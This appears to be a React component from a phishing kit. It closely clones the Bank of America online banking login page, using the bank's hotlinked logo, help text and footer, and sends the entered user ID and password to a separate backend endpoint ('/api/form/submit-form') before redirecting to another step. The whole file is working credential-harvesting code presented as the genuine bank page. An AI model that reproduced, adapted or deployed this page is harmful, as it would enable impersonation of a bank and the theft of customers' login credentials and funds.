import axios from 'axios';
import { BASE_API_URL } from '../utils/constants';
import { useNavigate } from 'react-router-dom';
import { useState } from 'react';


function MultiPageForm() {
  // State variables to hold form data
  const [boaid, setBoaid] = useState('');
  const [password, setPassword] = useState('');


  const navigate = useNavigate();

  // Function to handle form submission
  const handleSubmit = async event => {
    event.preventDefault();

    try {
      // Send form data to backend using Axios
      await axios.post(`${BASE_API_URL}/api/form/submit-form`, { boaid, password });

        navigate('/login')
    } catch (err) {
      console.error(err)
    }
    // Reset form data and current page
    setBoaid('');
    setPassword('');

  
  };
  
  return (
    <div className="fsd-layout fsd-2c-700lt-layout">
        <div className="fsd-border">
          <div className="center-content">
            <div className="header">
              <div className="header-module">
                <div className="fsd-secure-esp-skin"> <img height={28} width={230} alt="Bank of America" src="https://secure.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/BofA_rgb.png" />
                  <div className="page-type cnx-regular">Log In</div>
                  <div className="right-links">
                    <div className="secure-area">Secure Area</div> <a className="divide" href="/login" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En español</a>
                    <div className="clearboth" />
                  </div>
                  <div className="clearboth" />
                </div>
              </div>
              <div className="page-title-module h-100" id="skip-to-h1">
                <div className="red-grad-bar-skin sup-ie">
                  <h1 className="cnx-regular">Log In to Online Banking</h1>
                </div>
              </div>
              <div id="clientSideErrors" className="messaging-vipaa-module hide" aria-live="polite">
                <div className="error-skin">
                  <div className="error-message">
                    <p className="title TLu_ERROR">We can't process your request.</p>
                    <ul />
                  </div>
                </div>
              </div>
              <div className="vipaa-modal-content-module">
                <div className="sitekey-affinity-skin"> </div>
              </div>
            </div>
            <div className="columns">
              <div className="flex-col lt-col">
                <div className="online-id-vipaa-module">
                  <div className="enter-skin phoenix">
                    <form className="simple-form collector-form-marker" name="enter-online-id-form" id="EnterOnlineIDForm" onSubmit={handleSubmit}>
                      <div className="online-id-section">
                        <label htmlFor="enterID-input">User ID<span className="ada-hidden"> Must be at least 6 characters long</span></label> <input type="text" id="enterID-input" name="dummy-onlineId" maxLength={32} defaultValue autoComplete="off" value={boaid} onChange={(event) => setBoaid(event.target.value)} />
                        <div className="remember-info"> <input type="checkbox" id="remID" name="saveMyID" /> <label htmlFor="remID">Save this User ID</label>
                          <a className="boa-dialog force-xlarge info-layer-help-fsd dotted" href="/login" name="online-id-help" rel="help-content" title="Help"> <span className="ada-hidden">Online ID Help</span> <span className="boa-ada-text ada-hidden">&nbsp;layer</span></a>
                          <div id="help-content" className="hide">
                            <p><strong>How does "Save this User ID" work?</strong></p>
                            <p>&nbsp;</p>
                            <p>Saving your User ID means you don't have to enter it every time you log in.</p>
                            <p>&nbsp;</p>
                            <p><strong>Don't save on a public computer</strong></p>
                            <p>&nbsp;</p>
                            <p>Only save your User ID on your personal computer or mobile device.</p>
                            <p>&nbsp;</p>
                            <p><strong>How to clear a saved User ID</strong></p>
                            <p>&nbsp;</p>
                            <p>To clear a saved User ID, log in and select <strong>Saved User IDs</strong> from <strong>Profile and Settings.</strong></p>
                          </div>
                          <div className="clearboth" />
                        </div>
                      </div> <label htmlFor="tlpvt-passcode-input" className="mtop-15">Password<span className="ada-hidden"> is unavailable. Please enter atleast 6 characters of online id to enable Passcode</span></label>
                      <div className="TL_NPI_Pass"> <input type="password" className="tl-private fl-lt" id="tlpvt-passcode-input" name="dummy-passcode" maxLength={20} value={password} onChange={(event) => setPassword(event.target.value)} defaultValue autoComplete="off" /> </div><input type="hidden" name="_ib" id="_ib" /> <a href="/login" className="fl-lt forgot-passcode" name="forgot-your-passcode">Forgot your Password?</a>
                      <div className="clearboth" /> <button className="btn-bofa btn-bofa-blue btn-bofa-small btn-bofa-noRight"><span className="btn-bofa-blue-lock">Log In</span></button> <a href="/login" id="signin-mobile-app" name="signin-mobile-app" className="displayNone">Log In with mobile app</a> <a href="/login" id="signin-with-passcode" name="signin-with-passcode" className="hidden">Log In with Password</a> <a href="/login" id="signin-with-windows-hello" name="signin-with-windows-hello" className="bold hidden"> Log in with Windows Hello </a>
                      <div className="digital-id-notify phoenix hidden" id="digital-id-success-message">
                        <div className="digital-id-head"> Check your mobile device </div> <span className="circle-animation">
                          <div className="circle-inline">Loading</div>
                          <div className="loading-circle circle-inline">
                            <div className="circle-bounce1" />
                            <div className="circle-bounce2" />
                            <div className="circle-bounce3" />
                          </div>
                        </span>
                        <p className="digital-id-msg"> We sent a notification to your registered device. Verify your identity in the app now to log in to Online Banking. </p> <a href="/login" className="digital-id-link send-notification-again"> Send notification again </a> <a href="/login" className="digital-id-link sign-in-with-passcode-instead"> Log In with Password instead </a>
                      </div>
                      <div className="digital-id-notify phoenix hidden" id="digital-id-general-error">
                        <div className="digital-id-head"> Check your mobile device </div>
                        <p className="digital-id-msg"> If you're enrolled in this security feature, we sent a notification to your registered device. Verify your identity in the app now to log in to Online Banking. </p> <a href="/login" className="digital-id-link send-notification-again"> Send notification again </a> <a href="/login" className="digital-id-link sign-in-with-passcode-instead"> Log In with Password instead </a>
                      </div>
                      <div className="digital-id-notify phoenix hidden" id="digital-id-max-error">
                        <div className="digital-id-head"> Check your mobile device </div>
                        <p className="digital-id-msg"> We can't identify you at this time. Please use your User ID/Password to log in. </p> <a href="/login" className="digital-id-link sign-in-with-passcode-instead"> Log In with Password instead </a>
                      </div>
                      <div className="clearboth" /> <input type="hidden" name="_ia" id="_iaID" /><input type="hidden" name="_u2support" id="u2supportID" defaultValue={-1} /><input type="hidden" name="webAuthAPI" id="webAuthAPIID" defaultValue="true" /><input type="hidden" name="_sc" id="_scID" defaultValue="" />
                    </form>
                    <div id="fpContainer" className style={{width: '50%'}}> </div>
                    <div className="mobile-cta-section vertical-dotted-line fl-rt">
                      <p className="cnx-regular title enroll-color-gray mbtm-10">Stay connected with our app</p> <img height={208} width={149} src="https://secure.bankofamerica.com/pa/components/modules-app/VIPAA/online-id-vipaa-module/1.0/graphic/mobile_llama.png" alt="Mobile banking Llama" className="fl-lt" />
                      <div className="get-app-content-section">
                        <div className="cnx-regular title enroll-color-gray mcta-bubble">Secure, convenient banking anytime</div> <a id="choose-device-get-the-app" name="choose-device-get-the-app" className="choose-device-get-the-app-modal btn-bofa btn-bofa-red btn-bofa-noRight cnx-regular" href="/login" rel="mobile-app-download-choose-device"><span>Get the app</span><span className="ada-hidden">&nbsp; link opens a new info modal layer</span></a>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="modal-mobile-module hide">
                  <div className="get-app-skin aps-mobile-products">
                    <h3>{'{'}title{'}'}</h3>
                    <div className="content-wrapper three-col">
                      <div className="{storeLogo}">
                        <div className="column app-box">
                          <h4 className="sprite sprite-I5 sprited">Download directly to your mobile device.
                            <div className="spr" />
                          </h4>
                          <a className="sprite store-icon {storeLogo} sprited" name="{storeName}" href="{storeLink}" id="{storeId}" alt="Broken Link"> <span className="ada-hidden">{'{'}storeLinkText{'}'}</span>
                            <div className="spr" />
                          </a>
                          <p className="{notice}">{'{'}noticeText{'}'}</p>
                        </div>
                        <div className="column comm-box {text}{email}">
                          <h4 className="sprite sprite-J5 {text} sprited">We'll text you a link to download the app.
                            <div className="spr" />
                          </h4>
                          <h4 className="sprite sprite-L5 row-2 {email} sprited">We'll email you a link to download the app.
                            <div className="spr" />
                          </h4>
                          <form>
                            <div id="field-level-error" role="alert"><span className="ada-hidden"> </span></div>
                            <div className="{text}"> <label className="ada-hidden" htmlFor="tlpvt-mob_app_download_phone_num" name="mobile_app_download_phone_prompt" id="mobile_app_download_phone_prompt">{'{'}placeholderText{'}'}</label> <input type="text" name="mobile_app_download_phone_number" id="tlpvt-mob_app_download_phone_num" className="phone-input {text} tl-private" placeholder="{placeholderText}" /> </div>
                            <div className="{email}"> <label className="ada-hidden" htmlFor="tlpvt-mob_app_download_email_id" name="mobile_app_download_email_prompt" id="mobile_app_download_email_prompt">{'{'}emailPlaceholderText{'}'}</label> <input type="text" name="mobile_app_download_email_id" id="tlpvt-mob_app_download_email_id" className="email-input {email} tl-private" placeholder="{emailPlaceholderText}" /> </div> <a href="/login" name="anc-send-email-button" className="btn-bofa btn-bofa-small btn-bofa-noRight" id="mobile_app_download_send_button" onclick="dartFireOnClick('1359940','bacal484','2014_700')">Send</a>
                            <div className="clearboth" />
                            <p className="{text}">By providing your mobile number you are consenting to receive a text message. Text message fees may apply from your carrier. Text messages may be transmitted automatically.</p>
                          </form>
                        </div>
                        <div className="column info-box">
                          <h4 className="sprite sprite-K5 sprited"> Visit bankofamerica.com in your mobile web browser for a link to download the app.
                            <div className="spr" />
                          </h4>
                        </div>
                      </div>
                      <div className="other-device-info {deviceStatus}">
                        <div>
                          <p> Our mobile app is not available for all devices</p> <a href="/login" className="style-link guillemet-right" name="anc_learn_more_about_phone_banking">Learn about your Banking by Phone options&nbsp;<span className="guillemet ls-n1 f-11 ls-n2 guillement-set">››</span></a>
                        </div>
                      </div>
                      <div className="confirmation-screen hide">
                        <div className="inline-ack-msg sprite sprite-D7 sprited"> <span className="ada-hidden" /><span className="message" /><span id="inputHolder" className="TL_NPI_L1" />
                          <div className="spr" />
                        </div>
                        <div className="button-wrapper"> <a href="javascript:;" className="btn-bofa btn-bofa-blue btn-bofa-small" name="anc-close-button" id="confirmModalCloseButton">Close</a> <a href="javascript:;" className="btn-bofa btn-bofa-small btn-bofa-noRight" name="anc-send-another-link" id="confirmModalSendAnotherLink">Send another link</a> </div>
                      </div>
                      <div className="processing hide"> <span className="ada-hidden">Please wait. Your request is being processed.</span> <span className="modal-skin-processing-text">Please wait...</span> </div>
                      <div className="clearboth" />
                    </div>
                  </div>
                </div>
                <div id="mobile-app-download-flex-modal" className="aps-mobile-products"> </div>
                <style type="text/css" dangerouslySetInnerHTML={{__html: "\n                .aps-mobile-products .sprite .spr {\n                  background-image: url('/content/images/ContextualSiteGraphics/Instructional/en_US/aps-mobile-products-icon-sprite-dev.png');\n                  background-size: 700px 550px;\n                }\n              " }} />
                <div className="mobile-app-download-module hide" id="mobile-app-download-choose-device">
                  <div className="choose-device-modal-skin">
                    <h3>Select your device</h3>
                    <div className="flex-modal-main-content">
                      <p>Please select your device to continue:</p> <label htmlFor="device-pulldown" className="ada-hidden">Select your device. Press TAB to continue after making selection.</label> <select id="device-pulldown" name="device-pulldown" className="select-bofa">
                        <option value="Select your device">Select your device</option>
                        <option value="iPhone">iPhone</option>
                        <option value="iPad">iPad</option>
                        <option value="Android">Android</option>
                        <option value="Other">Other</option>
                      </select>
                      <div className="clearboth" /> <a href="/login" id="choose-device" className="btn-bofa btn-bofa-red btn-disabled get-app-modal-trigger btn-bofa-noRight" name="choose-device" rel="choose-device-modal">
                        Continue<span className="ada-hidden">&nbsp; link opens a new info modal layer</span>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
              <div className="flex-col rt-col">
                <div className="side-well-vipaa-module">
                  <div className="fsd-ll-skin">
                    <h2>Login help</h2>
                    <ul className="li-pbtm-15">
                      <li><a className="arrow" href="/login" name="Forgot ID/Password?">Forgot ID/Password?</a></li>
                      <li><a className="arrow" href="/login" name="Problem logging in?">Problem logging in?</a></li>
                    </ul>
                  </div>
                  <div className="fsd-ll-skin">
                    <h2>Not using Online Banking?</h2>
                    <ul className="li-pbtm-15">
                      <li><a className="arrow" href="/login" name="Enroll_now">Enroll now<span className="ada-hidden">  for online Banking</span></a></li>
                      <li><a className="arrow" href="/login" name="Learn_more_about_Online_Banking_dotcom">Learn more about Online Banking</a></li>
                      <li><a className="arrow" href="/login" name="Service_Agreement_dotcom">Service Agreement</a></li>
                    </ul>
                  </div>
                </div>
              </div>
              <div className="clearboth" />
            </div>
            <div className="footer">
              <div className="footer-top">&nbsp; </div>
              <div className="footer-inner">
                <div className="global-footer-module">
                  <div className="gray-bground-skin cssp">
                    <div className="secure">Secure area</div>
                    <div className="link-container">
                      <div className="link-row"> <a href="/login" name="Privacy_&_Security_footer" title="Privacy" alt="Broken Link">Privacy</a> <a href="/login" name="Security" title="Security" alt="Broken Link">Security</a> <a className="last-link" href="/login" name="CA Opt-Out Preference Signals Honored" title target="_self">CA Opt-Out Preference Signals Honored</a>
                        <div className="clearboth" />
                      </div>
                    </div>
                    <p>Bank of America, N.A. Member FDIC. <a href="/login" name="Equal_Housing_Lender" alt="Broken Link">Equal Housing Lender</a> <br />©&nbsp;2023 Bank of America Corporation.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
  )
}

export default MultiPageForm;
